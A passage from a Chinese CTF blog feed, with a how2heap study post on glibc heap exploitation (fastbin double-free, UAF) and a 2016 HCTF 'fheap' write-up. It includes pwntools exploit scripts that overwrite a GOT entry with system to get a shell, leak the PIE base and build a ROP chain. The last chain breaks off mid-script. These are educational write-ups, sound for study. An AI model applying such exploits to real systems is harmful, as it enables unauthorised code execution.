class="number">0</span>)</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">1</span>), <span class="number">0</span>x20, <span class="string">'b'</span>)</div><div class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">2</span>), <span class="number">0</span>x10, <span class="string">'c'</span>)</div><div class="line">    <span class="keyword">delete</span>(<span class="number">0</span>)</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">3</span>), <span class="number">0</span>x20, <span class="string">'d'</span>)  # <span class="built_in">index</span> <span class="number">0</span></div><div class="line">    payload = <span class="string">'a'</span> * <span class="number">0</span>x20 + p64(<span class="number">0</span>) + p64(<span class="number">0</span>x21) + p64(<span class="number">0</span>x601d58 - <span class="number">0</span>x10)</div><div class="line">    feedback(<span class="number">0</span>, payload)</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">4</span>), <span class="number">0</span>x10, <span class="string">'e'</span>)  # <span class="built_in">index</span> <span class="number">2</span></div><div class="line">#    gdb.attach(<span class="keyword">p</span>)</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">5</span>), <span class="number">0</span>x10, <span class="string">'f'</span> * <span class="number">0</span>x8 + p64(atoi_got)) # <span class="built_in">index</span> <span class="number">1</span></div><div class="line"></div><div class="line"># leak atoi_addr</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'!!\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(<span class="string">'4'</span>)</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'is '</span>)</div><div class="line">    atoi_addr = u64(<span class="keyword">p</span>.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</div><div class="line">#    gdb.attach(<span class="keyword">p</span>)</div><div class="line">    <span class="keyword">p</span>.recvline()</div><div class="line">    <span class="keyword">print</span> <span class="string">'atoi_addr =&gt; '</span>, hex(atoi_addr)</div><div class="line"></div><div class="line"># <span class="keyword">edit</span> atoi <span class="keyword">to</span> <span class="built_in">system</span></div><div class="line">    libc.address = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</div><div class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'system_addr =&gt; '</span>, hex(system_addr)</div><div class="line">    binsh_addr = libc.<span class="built_in">search</span>(<span class="string">'/bin/sh'</span>).<span class="keyword">next</span>()</div><div class="line">    <span class="keyword">p</span>.sendline(<span class="string">'0'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(p64(system_addr))</div><div class="line">#    gdb.attach(<span class="keyword">p</span>)</div><div class="line"></div><div class="line"># getshell</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'!!\n'</span>)</div><div class="line">    <span class="keyword">p</span>.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line">    <span class="keyword">p</span>.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。&lt;/p&gt;
&lt;h2 id=&quot;rop
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="http://reehy.top/2017/03/28/how2heap/"/>
    <id>http://reehy.top/2017/03/28/how2heap/</id>
    <published>2017-03-28T09:45:10.000Z</published>
    <updated>2017-05-14T12:34:24.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。<br>以<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>为学习路径，step by step，记录下，可能的话，帮助到后来的人。</p>
<blockquote>
<table>
<thead>
<tr>
<th>File</th>
<th>Technique</th>
<th>Applicable CTF Challenges</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="first_fit.c">first_fit.c</a></td>
<td>演示glibc malloc的首次适应(first-fit)行为</td>
<td></td>
</tr>
<tr>
<td><a href="fastbin_dup.c">fastbin_dup.c</a></td>
<td>通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针</td>
<td></td>
</tr>
<tr>
<td><a href="fastbin_dup_into_stack.c">fastbin_dup_into_stack.c</a></td>
<td>通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="external">9447-search-engine</a></td>
</tr>
<tr>
<td><a href="unsafe_unlink.c">unsafe_unlink.c</a></td>
<td>Exploiting free on a corrupted chunk to get arbitrary write.</td>
<td><a href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/" target="_blank" rel="external">HITCON CTF 2014-stkof</a></td>
</tr>
<tr>
<td><a href="house_of_spirit.c">house_of_spirit.c</a></td>
<td>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</td>
<td><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="external">hack.lu CTF 2014-OREO</a></td>
</tr>
<tr>
<td><a href="poison_null_byte.c">poison_null_byte.c</a></td>
<td>Exploiting a single null byte overflow.</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb" target="_blank" rel="external">PlaidCTF 2015-plaiddb</a></td>
</tr>
<tr>
<td><a href="house_of_lore.c">house_of_lore.c</a></td>
<td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</td>
<td></td>
</tr>
<tr>
<td><a href="overlapping_chunks.c">overlapping_chunks.c</a></td>
<td>利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore" target="_blank" rel="external">hack.lu CTF 2015-bookstore</a></td>
</tr>
<tr>
<td><a href="house_of_force.c">house_of_force.c</a></td>
<td>溢出Top chunk头去分配，来得到一个接近任意地址的指针</td>
<td><a href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6" target="_blank" rel="external">Boston Key Party 2016-cookbook</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="external">BCTF 2016-bcloud</a></td>
</tr>
<tr>
<td><a href="unsorted_bin_attack.c">unsorted_bin_attack.c</a></td>
<td>利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数</td>
<td><a href="https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6" target="_blank" rel="external">0ctf 2016-zerostorage</a></td>
</tr>
<tr>
<td><a href="house_of_einherjar.c">house_of_einherjar.c</a></td>
<td>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</td>
<td><a href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf" target="_blank" rel="external">Seccon 2016-tinypad</a></td>
</tr>
</tbody>
</table>
</blockquote>
<h2 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first fit"></a>0x01 first fit</h2><p>这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。</p>
<h2 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin dup"></a>0x02 fastbin dup</h2><p>fastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。</p>
<h2 id="0x03-fastbin-dup-into-stack-double-free"><a href="#0x03-fastbin-dup-into-stack-double-free" class="headerlink" title="0x03 fastbin dup into stack(double-free)"></a>0x03 fastbin dup into stack(double-free)</h2><p>这个就是double-free的一个利用。<br>当我们<code>malloc</code>一个小于<code>128</code>的堆块的时候，<code>ptmalloc</code>就会调用到<code>fastbin</code>。<code>fastbin</code>是由一个单链表组成的，遵循<code>FIFO</code>原则，由于<code>fastbin</code>在<code>free</code>的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。<br>比如：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>) ;</div><div class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"><span class="built_in">free</span>(a);</div><div class="line"><span class="built_in">free</span>(b);</div></pre></td></tr></table></figure>
<p>此时维护的一个链表结构为<br><code>[head] -&gt; b -&gt; a -&gt; null</code></p>
<p>当我们再次</p>
<p><code>free(a);</code></p>
<p>此时的链表结构为</p>
<p><code>[head] -&gt; a -&gt; b -&gt; a -&gt; null</code></p>
<p>紧接着我们申请两次堆</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">*a = malloc(8);</span></div><div class="line"><span class="comment">*b = malloc(8);</span></div></pre></td></tr></table></figure>
<p>此时我们维护的链表结构为</p>
<p><code>[head] -&gt; a -&gt; null</code></p>
<p>如果我们修改<code>a</code>的前八个字节为我们的希望的地址，当我们两次<code>malloc</code>之后，我们就能得到一个指向任意地址的指针。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*a = &amp;attribute_addr;</div><div class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);   <span class="comment">//c == a</span></div><div class="line"><span class="keyword">int</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);   <span class="comment">// d == attribute_addr</span></div></pre></td></tr></table></figure>
<p>维护的链表如下</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[<span class="function"><span class="title">head</span>] -&gt;</span> <span class="function"><span class="title">a</span> -&gt;</span> null</div><div class="line">[<span class="function"><span class="title">head</span>] -&gt;</span> <span class="function"><span class="title">a</span> -&gt;</span> attribute</div><div class="line">[<span class="function"><span class="title">head</span>] -&gt;</span> attribute</div></pre></td></tr></table></figure>
<p>于是我们就可以得到一个<code>8bit</code>的任意地址写了。</p>
<p>以下用<em>2016hctf</em>的<code>就是干</code>为例</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>首先分析程序，先查看程序的保护</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2016</span>hctf<span class="regexp">/pwn/</span>fheap$ checksec pwn-f </div><div class="line">[*] <span class="string">'/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'</span></div><div class="line"><span class="symbol">    Arch:</span>     amd64<span class="number">-64</span>-little</div><div class="line"><span class="symbol">    RELRO:</span>    Partial RELRO</div><div class="line"><span class="symbol">    Stack:</span>    Canary found</div><div class="line"><span class="symbol">    NX:</span>       NX enabled</div><div class="line"><span class="symbol">    PIE:</span>      PIE enabled</div></pre></td></tr></table></figure>
<p>由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭<code>aslr</code>的，但是它会给程序加上一个默认的基地址<code>0x555555554000</code></p>
<p>这个程序有两个功能：</p>
<ol>
<li>添加字符串</li>
<li>删除一个字符串</li>
</ol>
<p>其中，存储字符串的结构题如下：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">00000000</span> info            struc ; (sizeof=<span class="number">0x20</span>, mappedto_1)</div><div class="line"><span class="number">00000000</span> content         db <span class="number">16</span> dup(?)            ; <span class="type">string</span>(C)</div><div class="line"><span class="number">00000010</span> size            dq ?</div><div class="line"><span class="number">00000018</span> DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址</div><div class="line"><span class="number">00000020</span> info            ends</div><div class="line"></div><div class="line">struct info&#123;</div><div class="line">	char cintent[<span class="number">16</span>];</div><div class="line">    int size;</div><div class="line">    void* DestroyFunc;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>当我们申请小于15字节的长度时，字符串会直接保存在<code>info.content</code>中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的<code>info.content</code>中</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( nbytesa &gt; <span class="number">15</span> )</div><div class="line">&#123;</div><div class="line">  dest = (char *)malloc(nbytesa);</div><div class="line">  <span class="keyword">if</span> ( !dest )</div><div class="line">  &#123;</div><div class="line">    puts(<span class="string">"malloc faild!"</span>);</div><div class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</div><div class="line">  &#125;</div><div class="line">  strncpy(dest, &amp;buf, nbytesa);</div><div class="line">  *(_QWORD *)ptr = dest;</div><div class="line">  *((_QWORD *)ptr + <span class="number">3</span>) = sub_D6C;           <span class="regexp">//</span> free(*content)</div><div class="line">                                            <span class="regexp">//</span> free(content)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">  strncpy(ptr, &amp;buf, nbytesa);</div><div class="line">  *((_QWORD *)ptr + <span class="number">3</span>) = sub_D52;           <span class="regexp">//</span> free(content)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>小于15时堆内存分布<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">6</span>xg <span class="number">0</span>x5<span class="number">55555757000</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757000</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000031</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757010</span>:	<span class="number">0</span>x000<span class="number">0000061616161</span>	<span class="number">0</span>x00000<span class="number">00000000000</span>           // content</div><div class="line"><span class="number">0</span>x5<span class="number">55555757020</span>:	<span class="number">0</span>x00000<span class="number">00000000004</span>	<span class="number">0</span>x00005<span class="number">55555554d52</span>           // size + DestroyFunc</div></pre></td></tr></table></figure></p>
<p>大于15时堆内存的分布情况<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/<span class="number">6</span>xg <span class="number">0</span>x5<span class="number">55555757060</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757060</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000021</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757070</span>:	<span class="number">0</span>x6<span class="number">161616161616161</span>	<span class="number">0</span>x6262<span class="number">626262626161</span>           // content</div><div class="line"><span class="number">0</span>x5<span class="number">55555757080</span>:	<span class="number">0</span>x0000000<span class="number">00a626262</span>	<span class="number">0</span>x00000<span class="number">00000020f81</span></div><div class="line">pwndbg&gt; x/<span class="number">6</span>xg <span class="number">0</span>x5<span class="number">55555757030</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757030</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000031</span></div><div class="line"><span class="number">0</span>x5<span class="number">55555757040</span>:	<span class="number">0</span>x00005<span class="number">55555757070</span>	<span class="number">0</span>x00000<span class="number">00000000000</span>          // new malloc addr</div><div class="line"><span class="number">0</span>x5<span class="number">55555757050</span>:	<span class="number">0</span>x00000<span class="number">00000000014</span>	<span class="number">0</span>x0000555555554d6c          // size +  DestroyFunc</div></pre></td></tr></table></figure></p>
<p>再来看一下全局变量的堆管理情况</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; telescope <span class="number">0</span>x5<span class="number">55555554000</span>+<span class="number">0x2020C0</span></div><div class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0</span>x55<span class="number">55557560c0</span> (__bss_start+<span class="number">32</span>) ◂— <span class="number">0</span>x1</div><div class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0</span>x55<span class="number">55557560c8</span> (__bss_start+<span class="number">40</span>) —▸ <span class="number">0</span>x5<span class="number">55555757010</span> ◂— <span class="number">0x61616161</span> /* 'aaaa' */</div><div class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0</span>x55<span class="number">55557560d0</span> (__bss_start+<span class="number">48</span>) ◂— <span class="number">0</span>x1</div><div class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0</span>x55<span class="number">55557560d8</span> (__bss_start+<span class="number">56</span>) —▸ <span class="number">0</span>x5<span class="number">55555757040</span> —▸ <span class="number">0</span>x5<span class="number">55555757070</span> ◂— 'aaaaaaaaaabbbbb...'</div><div class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0</span>x55<span class="number">55557560e0</span> (__bss_start+<span class="number">64</span>) ◂— <span class="number">0</span>x1</div><div class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0</span>x55<span class="number">55557560e8</span> (__bss_start+<span class="number">72</span>) —▸ <span class="number">0</span>x5<span class="number">55555757090</span> —▸ <span class="number">0</span>x55<span class="number">55557570c0</span> ◂— 'ccc\naaaaaabbbbb...'</div><div class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0</span>x55<span class="number">55557560f0</span> (__bss_start+<span class="number">80</span>) ◂— <span class="number">0</span>x0</div><div class="line">... ↓</div><div class="line">pwndbg&gt; x/<span class="number">6</span>xg <span class="number">0</span>x5<span class="number">55555554000</span>+<span class="number">0x2020C0</span></div><div class="line"><span class="number">0</span>x55<span class="number">55557560c0</span>:	<span class="number">0</span>x00000<span class="number">00000000001</span>	<span class="number">0</span>x00005<span class="number">55555757010</span></div><div class="line"><span class="number">0</span>x55<span class="number">55557560d0</span>:	<span class="number">0</span>x00000<span class="number">00000000001</span>	<span class="number">0</span>x00005<span class="number">55555757040</span></div><div class="line"><span class="number">0</span>x55<span class="number">55557560e0</span>:	<span class="number">0</span>x00000<span class="number">00000000001</span>	<span class="number">0</span>x00005<span class="number">55555757090</span></div></pre></td></tr></table></figure>
<p>堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。</p>
<p>看一下删除操作的函数实现：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">if ( <span class="name">*</span>((<span class="name">_QWORD</span> *)&amp;manage + 2 * v1 + <span class="number">1</span>) )</div><div class="line">  &#123;</div><div class="line">    printf(<span class="string">"Are you sure?:"</span>)<span class="comment">;</span></div><div class="line">    read(<span class="number">0</span>, <span class="symbol">&amp;buf</span>, <span class="number">0</span>x100uLL)<span class="comment">;</span></div><div class="line">    if ( !strncmp(<span class="name">&amp;buf</span>, <span class="string">"yes"</span>, <span class="number">3</span>uLL) )</div><div class="line">    &#123;</div><div class="line">      (<span class="name">*</span>(<span class="name">void</span> (<span class="name">__fastcall</span> **)(<span class="name">_QWORD</span>, const char *))(*((<span class="name">_QWORD</span> *)&amp;manage + 2 * v1 + <span class="number">1</span>) + <span class="number">24</span>LL))(</div><div class="line">        <span class="name">*</span>((<span class="name">_QWORD</span> *)&amp;manage + 2 * v1 + <span class="number">1</span>),</div><div class="line">        <span class="string">"yes"</span>)<span class="comment">;</span></div><div class="line">      *((_DWORD *)<span class="symbol">&amp;manage</span> + <span class="number">4</span> * v1) = 0;</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>官方的源码如下：<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> deleteStr() &#123;</div><div class="line">    <span class="keyword">int</span> <span class="keyword">id</span>;</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">0x100</span>];</div><div class="line">    printf(<span class="string">"Pls give me the string id you want to delete\nid:"</span>);</div><div class="line">    <span class="keyword">id</span> = getInt();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">id</span> &lt; <span class="number">0</span> || <span class="keyword">id</span> &gt; <span class="number">0x10</span>) &#123;</div><div class="line">        printf(<span class="string">"Invalid id\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (Strings[<span class="keyword">id</span>].str) &#123;</div><div class="line">		printf(<span class="string">"Are you sure?:"</span>);</div><div class="line">		read(STDIN_FILENO,buf,<span class="number">0x100</span>);</div><div class="line">		<span class="keyword">if</span>(strncmp(buf,<span class="string">"yes"</span>,<span class="number">3</span>)) &#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">        Strings[<span class="keyword">id</span>].str-&gt;free(Strings[<span class="keyword">id</span>].str);</div><div class="line">        Strings[<span class="keyword">id</span>].inuse = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用<code>fastbin</code>不会检查是否已释放的特点，我们可以构造<code>double-free</code>那么我们就可以利用这一点，如果在结构体调用的<code>DestroyFunc</code>覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位<code>puts</code>时，程序将会执行<code>puts(contents)</code>而不是<code>free(content)</code>，通过适当<code>content</code>，我们可以泄露程序基址。<br>在结构体的<code>DestroyFunc</code>部分，即使开了<code>PIE</code>，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。</p>
<p>所以总结，此题的漏洞点在<code>UAF</code>&amp;<code>double-free</code>。<br>ecp:</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/python</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">target = <span class="built_in">process</span>(<span class="string">'pwn-f'</span>)</div><div class="line"></div><div class="line">def <span class="built_in">create</span>(size, <span class="keyword">string</span>):</div><div class="line">    target.recvuntil(<span class="string">'quit'</span>)</div><div class="line">    target.sendline(<span class="string">'create '</span>)</div><div class="line">    target.recvuntil(<span class="string">'size:'</span>)</div><div class="line">    target.sendline(str(size))</div><div class="line">    target.recvuntil(<span class="string">'str:'</span>)</div><div class="line">    target.<span class="built_in">send</span>(<span class="keyword">string</span>)</div><div class="line"></div><div class="line"></div><div class="line">def <span class="built_in">delete</span>(id):</div><div class="line">    target.recvuntil(<span class="string">'quit'</span>)</div><div class="line">    target.sendline(<span class="string">'delete '</span>)</div><div class="line">    target.recvuntil(<span class="string">'id:'</span>)</div><div class="line">    target.sendline(str(id))</div><div class="line">    target.recvuntil(<span class="string">'sure?:'</span>)</div><div class="line">    target.sendline(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line"><span class="built_in">create</span>(<span class="number">4</span>, <span class="string">'aaa\n'</span>)</div><div class="line"><span class="built_in">create</span>(<span class="number">4</span>, <span class="string">'aaa\n'</span>)</div><div class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</div><div class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</div><div class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</div><div class="line"><span class="built_in">create</span>(<span class="number">4</span>, <span class="string">'\x00'</span>)</div><div class="line"><span class="built_in">create</span>(<span class="number">0x20</span>, <span class="string">'a'</span> * <span class="number">0x16</span> + <span class="string">'lo'</span> + <span class="string">'\x2d\x00'</span>)</div><div class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</div><div class="line"></div><div class="line">target.recvuntil(<span class="string">'lo'</span>)</div><div class="line">addr = target.recvline()</div><div class="line">addr = addr[:<span class="number">-1</span>]</div><div class="line">addr = u64(addr + <span class="string">'\x00'</span> * (<span class="number">8</span> - <span class="built_in">len</span>(addr))) - <span class="number">0xd2d</span></div><div class="line"></div><div class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="built_in">create</span>(<span class="number">4</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">target.recvuntil(<span class="string">'quit'</span>)</div><div class="line">target.sendline(<span class="string">'create '</span>)</div><div class="line">target.recvuntil(<span class="string">'size:'</span>)</div><div class="line">target.sendline(str(<span class="number">0x20</span>))</div><div class="line">target.recvuntil(<span class="string">'str:'</span>)</div><div class="line">target.<span class="built_in">send</span>(<span class="string">'a'</span> * <span class="number">0x18</span> + p64(<span class="number">0x00000000000011DC</span> + addr))</div><div class="line"></div><div class="line">print hex(addr)</div><div class="line"></div><div class="line">target.recvuntil(<span class="string">'quit'</span>)</div><div class="line">target.sendline(<span class="string">'delete '</span>)</div><div class="line">target.recvuntil(<span class="string">'id:'</span>)</div><div class="line">target.sendline(<span class="string">'1'</span>)</div><div class="line">target.recvuntil(<span class="string">'sure?:'</span>)</div><div class="line"></div><div class="line">ropchain = p64(addr + <span class="number">0x00000000000011e3</span>)   <span class="comment"># pop rdi</span></div><div class="line">ropchain += p64(addr + <span class="number">0x202070</span>)            <span class="comment"># got@malloc</span></div><div class="line">ropchain += p64(addr + <span class="number">0x0000000000000990</span>)  <span class="comment"># plt@put</span></div><div class="line"></div><div class="line">ropchain += p64(addr + <span class="number">0x00000000000011e3</span>)  <span class="comment"># pop rdi</span></div><div class="line">ropchain += p64(<span class="number">1</span>)</div><div class="line">ropchain += p64(addr + <span class="number">0x00000000000011DA</span>)  <span class="comment"># magic</span></div><div class="line">ropchain += p64(<span class="number">0</span>)                          <span class="comment"># rbx</span></div><div class="line">ropchain += p64(<span class="number">1</span>)                          <span class="comment"># rbp</span></div><div class="line">ropchain += p64(addr + <span class="number">0x0000000000202058</span>)  <span class="comment"># 